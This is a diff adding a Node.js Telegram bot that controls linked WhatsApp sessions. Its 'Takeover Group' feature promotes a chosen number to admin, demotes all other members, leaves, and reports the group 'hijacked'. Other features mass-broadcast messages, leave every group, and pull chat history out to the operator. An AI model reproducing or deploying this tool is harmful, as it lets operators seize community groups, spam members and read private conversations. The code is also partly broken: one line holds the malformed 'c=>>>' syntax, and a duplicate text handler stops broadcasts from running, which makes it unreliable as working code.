@@ -1,0 +1,347 @@
+require('dotenv').config();
+const { default: makeWASocket, useSingleFileAuthState } = require('@adiwajshing/baileys');
+const { Telegraf, Markup } = require('telegraf');
+const qrcode = require('qrcode-terminal');
+const fs = require('fs-extra');
+const path = require('path');
+const crypto = require('crypto');
+
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const OWNER_ID       = Number(process.env.OWNER_ID);
+const MENU_IMAGE     = 'https://files.catbox.moe/jnw3mo.jpeg';
+
+// Allow override of sessions dir (for Render/Replit)
+const SESSIONS_DIR = process.env.SESSIONS_DIR || path.join(__dirname, 'sessions');
+const ALLOWED_FILE = path.join(__dirname, 'allowed.json');
+
+fs.ensureDirSync(SESSIONS_DIR);
+if (!fs.existsSync(ALLOWED_FILE)) fs.writeJsonSync(ALLOWED_FILE, [ OWNER_ID ]);
+
+const sessionState = {};     // pairingCode → { sock, owner }
+const pendingTarget = {};    // flow state for takeover & broadcast
+const profileUploads = {};   // for change‑profile flow
+
+// — Helpers —
+function loadAllowed() { return fs.readJsonSync(ALLOWED_FILE); }
+function saveAllowed(list) { fs.writeJsonSync(ALLOWED_FILE, list); }
+function genCode()   { return crypto.randomBytes(4).toString('hex').toUpperCase(); }
+function fancy(text) {
+  return text.split('').map(ch => {
+    const code = ch.charCodeAt(0);
+    if (65 <= code && code <= 90)  return String.fromCodePoint(0x1D400 + (code - 65));
+    if (97 <= code && code <= 122) return String.fromCodePoint(0x1D41A + (code - 97));
+    return ch;
+  }).join('');
+}
+
+// — Create & pair a new WhatsApp session —
+async function createSession(ctx) {
+  const pairingCode = genCode();
+  const jsonFile    = path.join(SESSIONS_DIR, `${pairingCode}.json`);
+  const { state, saveState } = useSingleFileAuthState(jsonFile);
+  const sock = makeWASocket({ auth: state, printQRInTerminal: false });
+
+  sock.ev.on('connection.update', update => {
+    if (update.qr) {
+      qrcode.generate(update.qr, { small: true }, qr =>
+        ctx.replyWithPhoto(
+          { source: Buffer.from(qr) },
+          { caption: `🔗 *Code:* \`${pairingCode}\`\nScan within 1 min`, parse_mode:'Markdown' }
+        )
+      );
+    }
+    if (update.connection === 'open') {
+      saveState();
+      sessionState[pairingCode] = { sock, owner: ctx.from.id };
+      ctx.reply(`✅ *Session ${pairingCode}* connected!`, { parse_mode:'Markdown' });
+      sendMainMenu(ctx);
+    }
+  });
+
+  sock.ev.on('creds.update', saveState);
+}
+
+// — Send the main graphic menu —
+function sendMainMenu(ctx) {
+  const allowed = loadAllowed();
+  if (!allowed.includes(ctx.from.id)) {
+    return ctx.reply(fancy('⛔ You are not allowed yet. Ask the owner to `/allow` you.'));
+  }
+
+  const rows = [
+    [ Markup.button.callback(fancy('📱 Pair New Session'),    'BTN_PAIR') ],
+    [ Markup.button.callback(fancy('🔄 List Sessions'),       'BTN_LIST') ],
+    [ Markup.button.callback(fancy('👥 Takeover Group'),      'BTN_TAKEOVER') ],
+    [ Markup.button.callback(fancy('🗂️ List Groups'),         'BTN_LISTGRP') ],
+    [ Markup.button.callback(fancy('🚪 End Session'),         'BTN_END') ],
+    [ Markup.button.callback(fancy('📢 Broadcast'),           'BTN_BCAST') ],
+    [ Markup.button.callback(fancy('📑 Group Info'),          'BTN_INFO') ],
+    [ Markup.button.callback(fancy('🚶 Leave All Groups'),    'BTN_LEAVEALL') ],
+    [ Markup.button.callback(fancy('🔄 Change Profile Pic'),  'BTN_CHPROF') ],
+    [ Markup.button.callback(fancy('📝 Backup Chats'),         'BTN_BACKUP') ],
+  ];
+
+  ctx.replyWithPhoto(
+    { url: MENU_IMAGE },
+    { caption: fancy('🌌 *THE OMNICELESTIAL Control Panel*'),
+      parse_mode:'Markdown', ...Markup.inlineKeyboard(rows)
+    }
+  );
+}
+
+// — Bot setup —
+const bot = new Telegraf(TELEGRAM_TOKEN);
+
+// Only allow approved users
+bot.use((ctx, next) => {
+  const allowed = loadAllowed();
+  if (ctx.from.id === OWNER_ID) return next();
+  if (!allowed.includes(ctx.from.id)) {
+    return ctx.reply(fancy('⛔ You’re not approved. Ask the owner.'));
+  }
+  return next();
+});
+
+// /start & /menu
+bot.start(sendMainMenu);
+bot.command('menu', sendMainMenu);
+
+// Owner: /allow & /disallow
+bot.command('allow', ctx => {
+  if (ctx.from.id !== OWNER_ID) return;
+  const id = Number(ctx.message.text.split(/\s+/)[1]);
+  if (!id) return ctx.reply('Usage: /allow <telegramId>');
+  const list = loadAllowed();
+  if (!list.includes(id)) { list.push(id); saveAllowed(list); ctx.reply('✅ Allowed'); }
+  else                  ctx.reply('✅ Already allowed');
+});
+bot.command('disallow', ctx => {
+  if (ctx.from.id !== OWNER_ID) return;
+  const id = Number(ctx.message.text.split(/\s+/)[1]);
+  let list = loadAllowed();
+  list = list.filter(x => x !== id);
+  saveAllowed(list);
+  ctx.reply('❌ Disallowed');
+});
+
+// — Button handlers —
+// Pair
+bot.action('BTN_PAIR',    async ctx => { ctx.answerCbQuery(); await createSession(ctx); });
+// List Sessions
+bot.action('BTN_LIST',    ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState)
+    .filter(([,s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  ctx.reply(fancy('📋 Your sessions:\n') + yours.map(c=>`• ${c}`).join('\n'));
+});
+
+// Takeover Group
+bot.action('BTN_TAKEOVER', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState)
+    .filter(([, s]) => s.owner === ctx.from.id)
+    .map(([c]) => c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c => [ Markup.button.callback(fancy(c), `TO_${c}`) ]);
+  ctx.reply(fancy('🎯 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^TO_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  const code = ctx.match[1], entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Invalid session.'));
+  const sock = entry.sock;
+  const all  = await sock.groupFetchAllParticipating();
+  const groups = Object.entries(all)
+    .filter(([,m]) => m.participants.some(p=>p.id===sock.user.id && p.admin))
+    .map(([gid,m])=>({ gid, name: m.subject }));
+  if (!groups.length) return ctx.reply(fancy('⚠️ No admin groups.'));
+  const rows = groups.map(g => [ Markup.button.callback(fancy(g.name), `SEL_${code}_${g.gid}`) ]);
+  ctx.reply(fancy('📋 Pick a group:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^SEL_(.+)_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  pendingTarget[ctx.from.id] = { code: ctx.match[1], groupId: ctx.match[2] };
+  ctx.reply(fancy('✉️ Send target number (e.g. 2348012345678):'));
+});
+bot.on('text', async ctx => {
+  const pend = pendingTarget[ctx.from.id];
+  if (!pend) return;
+  delete pendingTarget[ctx.from.id];
+  const { code, groupId } = pend;
+  const entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Session gone.'));
+  const sock = entry.sock;
+  const target = ctx.message.text.trim() + '@s.whatsapp.net';
+  ctx.reply(fancy('🚀 Executing takeover…'));
+  const meta = (await sock.groupFetchAllParticipating())[groupId];
+  const parts = meta.participants.map(p=>p.id);
+  await sock.groupParticipantsUpdate(groupId, [ target ], 'promote');
+  const others = parts.filter(id=>id!==target && id!==sock.user.id);
+  if (others.length) await sock.groupParticipantsUpdate(groupId, others, 'demote');
+  await sock.groupLeave(groupId);
+  ctx.reply(fancy(`✅ *${meta.subject}* hijacked.`));
+});
+
+// List Groups
+bot.action('BTN_LISTGRP', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState).filter(([, s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c=>[ Markup.button.callback(fancy(c), `LG_${c}`) ]);
+  ctx.reply(fancy('📂 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^LG_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  const code = ctx.match[1], entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Invalid.'));
+  const all = await entry.sock.groupFetchAllParticipating();
+  const names = Object.values(all).map(m=>m.subject);
+  ctx.reply(fancy('📂 Groups:\n') + names.map(n=>`• ${n}`).join('\n'));
+});
+
+// End Session
+bot.action('BTN_END', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState).filter(([, s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c=>[ Markup.button.callback(fancy(c), `END_${c}`) ]);
+  ctx.reply(fancy('🚪 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^END_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  const code = ctx.match[1];
+  delete sessionState[code];
+  fs.removeSync(path.join(SESSIONS_DIR, `${code}.json`));
+  ctx.reply(fancy(`🚫 Session ${code} terminated.`));
+});
+
+// Broadcast
+bot.action('BTN_BCAST', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState).filter(([, s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c=>[ Markup.button.callback(fancy(c), `BC_${c}`) ]);
+  ctx.reply(fancy('📢 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^BC_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  pendingTarget[ctx.from.id] = { broadcast: ctx.match[1] };
+  ctx.reply(fancy('✉️ Send broadcast message:'));
+});  
+bot.on('text', async ctx => {
+  const pend = pendingTarget[ctx.from.id];
+  if (pend?.broadcast) {
+    const code = pend.broadcast; delete pendingTarget[ctx.from.id];
+    const entry = sessionState[code];
+    if (!entry) return ctx.reply(fancy('❌ Session gone.'));
+    const sock = entry.sock;
+    const groups = Object.keys(await sock.groupFetchAllParticipating());
+    for (let gid of groups) {
+      await sock.sendMessage(gid, { text: ctx.message.text });
+    }
+    ctx.reply(fancy('✅ Broadcast sent!'));
+  }
+});
+
+// Group Info
+bot.action('BTN_INFO', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState).filter(([,s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c=>[ Markup.button.callback(fancy(c), `INFO_${c}`) ]);
+  ctx.reply(fancy('📑 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^INFO_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  const code = ctx.match[1], entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Invalid.'));
+  const sock = entry.sock;
+  const all = await sock.groupFetchAllParticipating();
+  const infos = Object.entries(all).map(([gid,m]) => {
+    const admins = m.participants.filter(p=>p.admin).map(p=>p.id.split('@')[0]);
+    return `*${m.subject}*\nID:\`${gid}\`\nMembers:${m.participants.length}\nAdmins:${admins.join(',')}`;
+  });
+  ctx.replyWithMarkdown(fancy('📑 Group Info:\n\n') + infos.join('\n\n'));
+});
+
+// Leave All Groups
+bot.action('BTN_LEAVEALL', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState).filter(([,s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c=>[ Markup.button.callback(fancy(c), `LEAVEALL_${c}`) ]);
+  ctx.reply(fancy('🚶 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^LEAVEALL_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  const code = ctx.match[1], entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Invalid.'));
+  const sock = entry.sock;
+  const groups = Object.keys(await sock.groupFetchAllParticipating());
+  for (let gid of groups) await sock.groupLeave(gid);
+  ctx.reply(fancy(`✅ Left ${groups.length} groups.`));
+});
+
+// Change Profile Pic
+bot.action('BTN_CHPROF', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState).filter(([,s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c=>>> Markup.button.callback(fancy(c), `CHP_${c}`) ]);
+  ctx.reply(fancy('🔄 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^CHP_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  profileUploads[ctx.from.id] = ctx.match[1];
+  ctx.reply(fancy('📸 Send new profile picture as photo.'));
+});
+bot.on('photo', async ctx => {
+  const code = profileUploads[ctx.from.id];
+  if (!code) return;
+  delete profileUploads[ctx.from.id];
+  const entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Session gone.'));
+  const sock = entry.sock;
+  const fileId = ctx.message.photo.pop().file_id;
+  const buff = await ctx.telegram.getFileBuffer(fileId);
+  await sock.query({ json: ['action','set',{ picture: buff.toString('base64') }] });
+  ctx.reply(fancy('✅ Profile picture updated!'));
+});
+
+// Backup Chats
+bot.action('BTN_BACKUP', async ctx => {
+  ctx.answerCbQuery();
+  const yours = Object.entries(sessionState).filter(([,s])=>s.owner===ctx.from.id).map(([c])=>c);
+  if (!yours.length) return ctx.reply(fancy('🚫 No sessions.'));
+  const rows = yours.map(c=>[ Markup.button.callback(fancy(c), `BKP_${c}`) ]);
+  ctx.reply(fancy('📝 Choose session:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^BKP_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  const code = ctx.match[1], entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Invalid.'));
+  const sock = entry.sock;
+  const all = await sock.groupFetchAllParticipating();
+  const groups = Object.entries(all).map(([gid,m])=>({ gid, name: m.subject }));
+  const rows = groups.map(g=>[ Markup.button.callback(fancy(g.name), `BKPSEL_${code}_${g.gid}`) ]);
+  ctx.reply(fancy('📝 Pick group:'), Markup.inlineKeyboard(rows));
+});
+bot.action(/^BKPSEL_(.+)_(.+)$/, async ctx => {
+  ctx.answerCbQuery();
+  const [ , code, gid ] = ctx.match;
+  const entry = sessionState[code];
+  if (!entry) return ctx.reply(fancy('❌ Invalid.'));
+  const sock = entry.sock;
+  const hist = await sock.loadMessages(gid, 20);
+  const txt = hist.messages
+    .map(m=>`[${m.key.id.slice(-5)}] ${m.message?.conversation||''}`)
+    .reverse()
+    .join('\n');
+  ctx.replyWithMarkdown(fancy(`📝 Backup for *${gid}*:\n\n`) + txt);
+});
+
+// — Launch —
+bot.launch();
+process.once('SIGINT', () => bot.stop());
+process.once('SIGTERM', () => bot.stop());
